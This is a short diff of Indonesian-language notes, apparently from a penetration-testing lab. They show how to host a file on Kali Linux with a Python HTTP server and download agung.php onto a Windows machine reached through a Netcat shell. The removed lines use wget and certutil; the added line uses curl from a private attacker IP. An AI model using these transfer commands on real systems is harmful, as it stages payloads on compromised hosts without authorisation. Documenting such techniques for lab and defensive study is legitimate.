@@ -2,12 +2,6 @@ jalankan
 python3 -m http.server 8080
 di kali linux
 
-2. Download File di Windows (Dari Terminal Netcat)
-Setelah server HTTP berjalan, gunakan perintah wget di terminal Windows yang telah Anda akses:
-
 cmd
-wget 192.168.1.8:8080/agung.php -O C:\Users\Agung Temorubun\Desktop\agung.php
-atau jika wget tidak tersedia, Anda bisa menggunakan certutil:
+curl -O http://172.16.133.201:8080/agung.php
 
-cmd
-certutil -urlcache -f http://192.168.1.8:8080/agung.php C:\Users\Agung Temorubun\Desktop\agung.php
